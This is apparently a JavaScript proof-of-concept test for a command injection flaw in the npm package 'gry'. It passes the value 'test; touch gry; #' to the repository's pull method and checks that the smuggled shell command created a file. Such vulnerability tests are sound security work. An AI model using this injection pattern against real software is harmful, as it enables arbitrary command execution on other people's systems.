
test("Command Injection in gry", () => 
{
    const Repo = require("gry");
	const fs = require('fs');
	const path = './gry';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	let myRepo = new Repo(".");
	myRepo.pull('test; touch gry; #', function(){console.log('Finished!')});
		
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});